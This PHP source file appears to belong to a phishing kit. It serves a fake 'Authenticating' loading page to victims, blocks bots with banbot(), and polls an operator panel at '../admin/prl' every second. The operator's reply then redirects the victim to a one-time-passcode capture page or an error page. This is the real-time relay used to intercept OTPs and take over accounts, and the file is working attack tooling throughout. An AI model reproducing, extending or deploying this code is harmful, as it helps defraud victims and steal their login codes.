<?php
if($grabotp==0){banbot();}
if(isset($_GET[$theerrkey])){$msg="Verifying you";$isrrrr=$theerrkey;}
else{$msg="Authenticating";$isrrrr='';};
echo '<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">

<script>
var l="'.getadmin('live').'";
function submitupdate(clid,setnew) {
if(setnew == 1){var setn = "setnew=true";} else{setn="";};
var http = new XMLHttpRequest();
http.open("POST","../admin/prl", true);
http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
var params = "update="+clid+"&client=true&"+setn;
http.send(params);
http.onload=function(){if(setnew == 0){var res=http.responseText;if(res==1){window.location.href="'.$index."?".genv(gonext("otp"))."=".md5(rand(10, 9999)).'";} else if(res==2){window.location.href="'.$index."?".genv("otpage")."=".md5(rand(10, 9999)).'&'.$isrrrr.'";} else if(res==0){window.location.href="'.$index."?".genv(gonext("otp",-1))."=".md5(rand(10, 9999)).'&'.$theerrkey.'=true";};};};
};
if(l=="on"){
submitupdate('.$_SESSION['client'].',1);
var interval = setInterval(function(){submitupdate('.$_SESSION['client'].',0);}, 1000);}
else{setTimeout(function(){window.location.href="'.$index."?".genv("otpage")."=".md5(rand(10, 9999)).'";}, 7000);};

</script>
<title> Login... </title>
<link rel="shortcut icon" href="'.gaflder().gefnm("/favicon.ico").'" type="image/x-icon">

<style>
	html,body{height:100%;width:100%;padding:0;margin:0;background-color:#f9f7f4;position:relative;box-sizing:border-box;
background: #f9f7f4;
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);}
   
    .contt-rot{
        width: auto;
        height:100%;
        margin: auto;position:relative;background-color:#f9f7f4;z-index:900;
background: #f9f7f4;
    -ms-filter: alpha(opacity=90);
    filter: alpha(opacity=90);
	  --one: #ccc;
	  --third: #d9003b;
    }
    .content{
		width:80%;
        max-width: 300px;
		text-align:center;
        margin: auto;position:relative;
		top:26%;
    }
    .layout{
        text-align: center;
        margin: 65px 0 20px;
    }
    .layout h3{
		color:#fff;
        margin-bottom: 40px;
        font-size: 18px;
    }
    .rrotate{
        display: inline-block;box-sizing:border-box;
        margin: auto auto;
        height:28px;
        width:28px;
        -webkit-animation: rotation .7s infinite linear;
        -moz-animation: rotation .7s infinite linear;
        -o-animation: rotation .7s infinite linear;
        animation: rotation .7s infinite linear;
        border-left:4px solid var(--one);
        border-right:4px solid var(--third);
        border-bottom:4px solid var(--third);
        border-top:4px solid var(--third);
        border-radius:100%;
    }
    @keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	form{position:absolute;z-index:0;top:0}
</style>
</head>
<body>
<div class="contt-rot">
    <div class="content">
        <div class="layout">
            <h3>&nbsp;</h3>
            <div class="rrotate"></div>
        </div>
		'.$msg.'.....
    </div>
</div>
	<footer></footer>
</body>
</html>';
?>